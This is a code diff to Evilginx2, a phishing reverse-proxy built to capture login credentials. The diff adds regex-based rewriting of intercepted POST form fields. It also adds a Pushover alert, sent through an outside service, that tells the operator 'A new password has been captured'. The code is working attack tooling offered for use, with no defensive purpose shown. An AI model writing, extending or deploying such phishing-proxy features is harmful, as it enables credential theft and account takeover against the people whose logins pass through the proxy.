@@ -35,6 +35,7 @@ import (
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
+	"github.com/gregdel/pushover"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
@@ -703,7 +704,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 										if ok_search {
 											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
+												newValue := fp_f.value
+												if fp_f.search != nil {
+													originalValue := req.PostForm.Get(fp_f.key)
+													matched := fp_f.search.FindString(originalValue)
+													log.Debug("Checking key: %s, value: %s, search: %s", fp_f.key, originalValue, fp_f.search)
+													if matched != "" {
+														// If a match is found, replace it in the original value
+														newValue = strings.ReplaceAll(originalValue, matched, fp_f.value)
+													}
+												}
+												// Set the (possibly updated) value in the form
+												req.PostForm.Set(fp_f.key, newValue)
 											}
 											body = []byte(req.PostForm.Encode())
 											req.ContentLength = int64(len(body))
@@ -1412,6 +1424,21 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	if ok {
 		s.SetPassword(password)
 	}
+
+	// Create Pushover client with the current AppKey
+	pushoverClient := pushover.New(p.cfg.pushoverConfig.AppKey)
+
+	// Send Pushover Notification
+	recipient := pushover.NewRecipient(p.cfg.pushoverConfig.UserKey)
+	message := &pushover.Message{
+		Message: "A new password has been captured, session:",
+		Title:   "Notification from Evilginx2",
+	}
+	_, err := pushoverClient.SendMessage(message, recipient)
+	if err != nil {
+		log.Error("Failed to send Pushover notification: %v", err)
+	}
+	   
 }
 
 func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
